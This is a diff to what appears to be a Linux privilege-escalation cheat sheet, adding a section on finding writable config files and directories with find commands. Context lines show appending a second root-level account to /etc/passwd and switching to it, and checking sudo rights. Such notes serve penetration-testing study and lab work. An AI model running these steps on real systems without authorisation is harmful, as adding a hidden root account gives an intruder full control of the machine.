@@ -88,6 +88,20 @@ echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
 ```
 
+## Writable
+
+Writable config files, if a service config file is writable, can be used to privesc
+
+```
+find /etc -writable -type f 2>/dev/null
+```
+
+Writable directories
+
+```
+find / -writable -type d 2>/dev/null
+```
+
 ## sudo - superuser stuff
 
 ```sudo -l```
